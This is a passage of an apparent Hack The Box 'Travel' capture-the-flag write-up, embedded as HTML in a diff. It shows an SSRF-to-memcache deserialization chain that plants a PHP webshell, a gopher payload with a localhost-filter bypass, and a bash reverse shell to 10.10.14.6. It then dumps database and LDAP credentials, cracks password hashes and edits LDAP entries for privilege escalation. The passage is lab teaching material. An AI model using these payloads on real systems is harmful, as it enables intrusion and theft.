+  Server: nginx/1.17.6
+  Date: Sun, 04 Apr 2021 16:13:30 GMT
+  Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+  Connection: keep-alive
+</code></pre></div></div>
+
+<h3 id="35-exploiting-the-rss-feed-via-ssrf">3.5 Exploiting the RSS Feed via SSRF</h3>
+
+<p>The <strong>memcache</strong> service is running via localhost and based on <strong>template.php</strong>, the sanitation of user input is limited to blacklisting “<strong>localhost</strong>” and “<strong>127.0.0.1</strong>” which could easily be bypassed:</p>
+
+<h4 id="351-leverage-the-templatehelper-class">3.5.1 Leverage the TemplateHelper class</h4>
+
+<p>Serialized objects are passed through <strong><code class="highlighter-rouge">memcache</code></strong> so we will use the <strong><code class="highlighter-rouge">TemplateHelper</code></strong> to write a file into the server.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">__DIR__</span><span class="o">.</span><span class="s1">'/logs/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$afw</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TemplateHelper</span><span class="p">(</span><span class="s2">"jebidiah.php"</span><span class="p">,</span> <span class="s1">'&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;'</span><span class="p">);</span>
+
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$afw</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>The initialized variables, <strong><code class="highlighter-rouge">$file</code></strong> and <strong><code class="highlighter-rouge">$data</code></strong>, were changed from being defined as <strong><code class="highlighter-rouge">private</code></strong> to <strong><code class="highlighter-rouge">public</code></strong> since the serialized data will be interpreted from outside the definition of the <strong><code class="highlighter-rouge">TemplateHelper</code></strong> class.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php serialize.php
+
+  <span class="o">[</span>...omitted...]
+  O:14:<span class="s2">"TemplateHelper"</span>:2:<span class="o">{</span>s:4:<span class="s2">"file"</span><span class="p">;</span>s:12:<span class="s2">"jebidiah.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:39:<span class="s2">"&lt;?php echo shell_exec(</span><span class="nv">$_GET</span><span class="s2">["</span>cmd<span class="s2">"]); ?&gt;"</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+
+<h4 id="352-using-gopherus-to-generate-payload">3.5.2 Using Gopherus to Generate Payload:</h4>
+
+<p>This is a tool that helps to abuse SSRF vulnerabilities and achieve <em>Remote Code Execution</em> (RCE).</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gopherus <span class="nt">--exploit</span> phpmemcache
+
+  Give serialization payload
+  example: O:5:<span class="s2">"Hello"</span>:0:<span class="o">{}</span>   : O:14:<span class="s2">"TemplateHelper"</span>:2:<span class="o">{</span>s:20:<span class="s2">"TemplateHelperfile"</span><span class="p">;</span>s:12:<span class="s2">"jebidiah.php"</span><span class="p">;</span>s:20:<span class="s2">"TemplateHelperdata"</span><span class="p">;</span>s:39:<span class="s2">"&lt;?php echo shell_exec(</span><span class="nv">$_GET</span><span class="s2">["</span>cmd<span class="s2">"]); ?&gt;"</span><span class="p">;</span><span class="o">}</span>
+
+  Your gopher <span class="nb">link </span>is ready to <span class="k">do </span>SSRF :
+  
+  gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+
+</code></pre></div></div>
+
+<h4 id="353-bypassing-the-security-check-in-templatephp">3.5.3 Bypassing the security check in template.php</h4>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+<span class="p">{</span>		
+	<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>	
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The only checks are only if the URL is requested via “<strong>localhost</strong>” and “<strong>127.0.0.1</strong>”. This could easily bypassed by using <strong><code class="highlighter-rouge">2130706433</code></strong> (decimal value for 127.0.0.1), using <strong><code class="highlighter-rouge">0.0.0.0</code></strong>, or using <strong><code class="highlighter-rouge">0</code></strong>. The payload will be changed to:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%20145%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:12:%22jebidiah.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+</span></code></pre></div></div>
+
+<h4 id="354-writing-the-gopher-payload-to-cache">3.5.4 Writing the gopher payload to cache</h4>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"</span> http://blog.travel.htb/awesome-rss/
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"debug=1"</span> http://blog.travel.htb/awesome-rss/
+<span class="go">  [...omitted...]
+  &lt;!--
+  DEBUG
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  | SpyD3r | O:14:"TemplateHelper":2:{s:20:"Tem(...) |
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+</span><span class="gp">  --&gt;</span><span class="w">
+</span><span class="go">  [...omitted...]
+</span></code></pre></div></div>
+
+<p>The serialized payload from earlier was successfully written to the cache.</p>
+
+<h4 id="355-how-data-is-loaded-from-the-cache">3.5.5 How data is loaded from the cache</h4>
+
+<p>Based on <a href="https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php"><strong>Memcache.php</strong></a></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="nf">load</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">return</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>A check for a valid name(<strong>xct_&lt;md5&gt;</strong>) is performed so it might be necessary for the data to be deserialized. The earlier execution was written as <strong><code class="highlighter-rouge">SpyD3r</code></strong> (Gopherus default) payload will be changed to:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+</span></code></pre></div></div>
+
+<h4 id="356-deserializing-the-right-way">3.5.6 Deserializing the right way</h4>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"</span> <span class="nt">--silent</span> http://blog.travel.htb/awesome-rss/ <span class="o">&gt;</span>/dev/null
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"debug=1"</span> http://blog.travel.htb/awesome-rss/
+<span class="go">  [...omitted...]
+  &lt;!--
+  DEBUG
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  | xct_54bddbaec1(...) | O:14:"TemplateHelper":2:{s:20:"Tem(...) |
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+</span><span class="gp">  --&gt;</span><span class="w">
+</span><span class="go">  [...omitted...]
+  
+</span><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"debug=1&amp;custom_feed_url=http://10.10.14.6/customfeed.xml"</span> <span class="nt">--silent</span> http://blog.travel.htb/awesome-rss/ | <span class="nb">grep </span>xct
+</code></pre></div></div>
+
+<p>The last <strong><code class="highlighter-rouge">curl</code></strong> command was added to trigger the cached request to <strong><code class="highlighter-rouge">xct_54bddbaec1543acec82c7141efde0625</code></strong> but this time, the serialized content was from the <strong>gopherus</strong> payload.</p>
+
+<h4 id="357-the-uploaded-webshell">3.5.7 The Uploaded Webshell</h4>
+
+<p>Checking if the webshell was uploaded into the server:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-I</span> http://blog.travel.htb/wp-content/themes/twentytwenty/logs/jebidiah.php
+
+  HTTP/1.1 200 OK
+  Server: nginx/1.17.6
+  Date: Sun, 04 Apr 2021 17:11:09 GMT
+  Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+  Connection: keep-alive
+  X-Powered-By: PHP/7.3.16
+</code></pre></div></div>
+
+<p>Commands could now be executed in the server:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"cmd=id"</span> http://blog.travel.htb/wp-content/themes/twentytwenty/logs/jebidiah.php
+
+  <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="part-4--pivot-to-another-user-www-data---lynik-admin">PART 4 : PIVOT TO ANOTHER USER (www-data -&gt; lynik-admin)</h2>
+
+<p>Setup a <strong>netcat</strong> listener for the reverse shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvp</span> 443
+</code></pre></div></div>
+
+<p>Execute the reverse shell using the uploaded webshell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'"</span> http://blog.travel.htb/wp-content/themes/twentytwenty/logs/jebidiah.php
+</code></pre></div></div>
+
+<h3 id="41-machine-enumeration">4.1 Machine Enumeration</h3>
+
+<h4 id="411-host-information">4.1.1 Host Information</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blog:/var/www/html<span class="nv">$ </span><span class="nb">hostname
+
+  </span>blog
+
+www-data@blog:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"sh$"</span>
+
+  root:x:0:0:root:/root:/bin/bash
+  
+www-data@blog:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> / | <span class="nb">grep </span>docker
+
+  <span class="nt">-rwxr-xr-x</span>   1 root root    0 Apr 23  2020 .dockerenv
+</code></pre></div></div>
+
+<p>No other users are in the system and upon further checking, it seems like the current shell is inside a docker container.</p>
+
+<h4 id="412-database-information">4.1.2 Database Information</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blog:/var/www/html<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
+
+  // <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+  /<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+  define<span class="o">(</span> <span class="s1">'DB_NAME'</span>, <span class="s1">'wp'</span> <span class="o">)</span><span class="p">;</span>
+
+  /<span class="k">**</span> MySQL database username <span class="k">*</span>/
+  define<span class="o">(</span> <span class="s1">'DB_USER'</span>, <span class="s1">'wp'</span> <span class="o">)</span><span class="p">;</span>
+
+  /<span class="k">**</span> MySQL database password <span class="k">*</span>/
+  define<span class="o">(</span> <span class="s1">'DB_PASSWORD'</span>, <span class="s1">'fiFtDDV9LYe8Ti'</span> <span class="o">)</span><span class="p">;</span>
+
+  /<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+  define<span class="o">(</span> <span class="s1">'DB_HOST'</span>, <span class="s1">'127.0.0.1'</span> <span class="o">)</span><span class="p">;</span>
+
+  /<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
+  define<span class="o">(</span> <span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8mb4'</span> <span class="o">)</span><span class="p">;</span>
+
+  /<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
+  define( '</span>DB_COLLATE<span class="s1">', '' );
+  
+www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "SHOW DATABASES;"
+
+  Database
+  information_schema
+  mysql
+  performance_schema
+  wp
+
+www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "USE wp; SHOW TABLES;"
+  
+  Tables_in_wp
+  [...omitted...]
+  wp_users
+
+www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "SELECT user_login,user_pass,user_nicename,user_email,display_name FROM wp.wp_users;"
+</span></code></pre></div></div>
+<p>user_login | user_pass | user_nicename | user_email | display_name
+— | — | — | — | —
+admin | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin | admin@travel.htb | admin</p>
+
+<p>There are still no username aside from <strong><code class="highlighter-rouge">admin</code></strong> listed in the database.</p>
+
+<h4 id="413-search-for-a-valid-user">4.1.3 Search for a Valid User</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blog:/<span class="nv">$ </span>find /opt <span class="nt">-readable</span> <span class="nt">-uid</span> 0 <span class="nt">-type</span> f 2&gt;/dev/null
+
+  /opt/wordpress/backup-13-04-2020.sql
+  
+www-data@blog:/<span class="nv">$ </span>strings /opt/wordpress/backup-13-04-2020.sql
+
+  INSERT INTO <span class="sb">`</span>wp_users<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/'</span>,<span class="s1">'admin'</span>,<span class="s1">'admin@travel.htb'</span>,<span class="s1">'http://localhost'</span>,<span class="s1">'2020-04-13 13:19:01'</span>,<span class="s1">''</span>,0,<span class="s1">'admin'</span><span class="o">)</span>,<span class="o">(</span>2,<span class="s1">'lynik-admin'</span>,<span class="s1">'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'</span>,<span class="s1">'lynik-admin'</span>,<span class="s1">'lynik@travel.htb'</span>,<span class="s1">''</span>,<span class="s1">'2020-04-13 13:36:18'</span>,<span class="s1">''</span>,0,<span class="s1">'Lynik Schmidt'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>It seems like from the SQL backup file, there were initially two users in the <strong><code class="highlighter-rouge">wp_users</code></strong> table:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>user_login</th>
+      <th>user_pass</th>
+      <th>user_nicename</th>
+      <th>user_email</th>
+      <th>display_name</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin</td>
+      <td>$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/</td>
+      <td>admin</td>
+      <td>admin@travel.htb</td>
+      <td>admin</td>
+    </tr>
+    <tr>
+      <td>lynik-admin</td>
+      <td>$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.</td>
+      <td>lynik-admin</td>
+      <td>lynik@travel.htb</td>
+      <td>Lynik Schmidt</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="42-cracking-the-hashes">4.2 Cracking the Hashes</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">--force</span> <span class="nt">-m</span> 400 hashes /usr/share/wordlists/rockyou.txt
+
+  <span class="nv">$P$B</span>/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.:1stepcloser
+</code></pre></div></div>
+
+<h3 id="43-login-via-ssh-as-lynik-admin">4.3 Login via SSH as lynik-admin</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-l</span> lynik-admin 10.10.10.189
+
+lynik-admin@10.10.10.189<span class="s1">'s password: 1stepcloser
+
+lynik-admin@travel:~$ cat user.txt
+
+  829b1a348e8c6ed74b876c305c470492
+  
+</span></code></pre></div></div>
+
+<h2 id="part-5--pivot-to-another-user-lynik-admin---brian">PART 5 : PIVOT TO ANOTHER USER (lynik-admin -&gt; brian)</h2>
+
+<h3 id="51-machine-enumeration">5.1 Machine Enumeration</h3>
+
+<h4 id="511-host-information">5.1.1 Host information</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"sh$"</span>
+
+  root:x:0:0:root:/root:/bin/bash
+  trvl-admin:x:1000:1000:trvl-admin:/home/trvl-admin:/bin/bash
+  lynik-admin:x:1001:1001::/home/lynik-admin:/bin/bash
+  
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> /etc/ssh/sshd_config
+
+  <span class="o">[</span>...omitted...]
+  AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
+  AuthorizedKeysCommandUser nobody
+  <span class="o">[</span>...omitted...]
+</code></pre></div></div>
+
+<p>There is an <strong><code class="highlighter-rouge">AuthorizedKeysCommand</code></strong> in the <strong><code class="highlighter-rouge">sshd_config</code></strong> file. <strong><code class="highlighter-rouge">/usr/bin/sss_ssh_authorizedkeys</code></strong> will be responsible to supply public keys that will be used for authentication. This helps with not having public keys locally stored into the server.</p>
+
+<h4 id="512-user-directory-enumeration">5.1.2 User Directory Enumeration</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>lynik-admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>lynik-admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>lynik-admin<span class="o">)</span>
+  
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+
+  <span class="o">[</span>...omitted...]
+  <span class="nt">-rw-r--r--</span> 1 lynik-admin lynik-admin   82 Apr 23  2020 .ldaprc
+  <span class="o">[</span>...omitted...]
+  <span class="nt">-rw-------</span> 1 lynik-admin lynik-admin  861 Apr 23  2020 .viminfo
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .ldaprc
+ 
+  HOST ldap.travel.htb
+  BASE <span class="nv">dc</span><span class="o">=</span>travel,dc<span class="o">=</span>htb
+  BINDDN <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+  
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> .viminfo
+
+  <span class="c"># Registers:</span>
+  <span class="s2">""</span>1	LINE	0
+    	BINDPW Theroadlesstraveled
+  |3,1,1,1,1,0,1587670528,<span class="s2">"BINDPW Theroadlesstraveled"</span>
+</code></pre></div></div>
+
+<p>There is an LDAP bind password for the user <strong><code class="highlighter-rouge">lynick-admin</code></strong> cached in the <strong><code class="highlighter-rouge">.viminfo</code></strong> file as well the LDAP configuration for the said user.</p>
+
+<h3 id="52-ldap-enumeration">5.2 LDAP Enumeration</h3>
+
+<h4 id="521-ldapsearch">5.2.1 ldapsearch</h4>
+
+<p>Looking at the available LDAP objects:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-b</span> <span class="s1">'dc=travel,dc=htb'</span> <span class="nt">-H</span> ldap://ldap.travel.htb <span class="nt">-w</span> <span class="s2">"Theroadlesstraveled"</span> <span class="s2">"objectClass=*"</span>
+
+  <span class="c"># lynik-admin, travel.htb</span>
+  dn: <span class="nv">cn</span><span class="o">=</span>lynik-admin,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+  description: LDAP administrator
+  objectClass: simpleSecurityObject
+  objectClass: organizationalRole
+  cn: lynik-admin
+  userPassword:: <span class="nv">e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ</span><span class="o">=</span>
+  <span class="o">[</span>...omitted...]
+  <span class="c"># domainusers, groups, linux, servers, travel.htb</span>
+  dn: <span class="nv">cn</span><span class="o">=</span>domainusers,ou<span class="o">=</span><span class="nb">groups</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+  memberUid: frank
+  memberUid: brian
+  memberUid: christopher
+  memberUid: johnny
+  memberUid: julia
+  memberUid: jerry
+  memberUid: louise
+  memberUid: eugene
+  memberUid: edward
+  memberUid: gloria
+  memberUid: lynik
+  gidNumber: 5000
+  cn: domainusers
+  objectClass: top
+  objectClass: posixGroup
+  <span class="o">[</span>...omitted...]
+</code></pre></div></div>
+
+<p>The current user, <strong>lynik-admin</strong>, is the LDAP Administrator which means everything here is pretty much under the user’s control.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://ldap.travel.htb <span class="nt">-w</span> <span class="s2">"Theroadlesstraveled"</span> <span class="nt">-b</span> <span class="s1">'uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb'</span>
+
+  <span class="c"># brian, users, linux, servers, travel.htb</span>
+  dn: <span class="nv">uid</span><span class="o">=</span>brian,ou<span class="o">=</span><span class="nb">users</span>,ou<span class="o">=</span>linux,ou<span class="o">=</span>servers,dc<span class="o">=</span>travel,dc<span class="o">=</span>htb
+  uid: brian
+  cn: Brian Bell
+  sn: Bell
+  givenName: Brian
+  loginShell: /bin/bash
+  uidNumber: 5002
+  gidNumber: 5000
+  homeDirectory: /home/brian
+  objectClass: top
+  objectClass: person
+  objectClass: organizationalPerson
+  objectClass: inetOrgPerson
+  objectClass: posixAccount
+  objectClass: shadowAccount
+</code></pre></div></div>
+
+<p>There are many other users in the domain but I guess <strong><code class="highlighter-rouge">brian</code></strong>’s the lucky one.</p>
+
+<h4 id="522-ldapmodify">5.2.2 ldapmodify</h4>
+
+<p>This will be an attempt to edit the user, <strong><code class="highlighter-rouge">brian</code></strong>’s LDAP entry.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">cat</span> /etc/group
+
+  <span class="o">[</span>...omitted...]
+  <span class="nb">sudo</span>:x:27:trvl-admin
+  <span class="o">[</span>...omitted...]
+</code></pre></div></div>
+
+<p>First is to create an <strong>ldif</strong> file that will be used to add a public key and change the group and password of the user:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span> <span class="o">&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"changetype: modify"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"add: objectClass"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"objectClass: ldapPublicKey"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"-"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"add: sshPublicKey"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
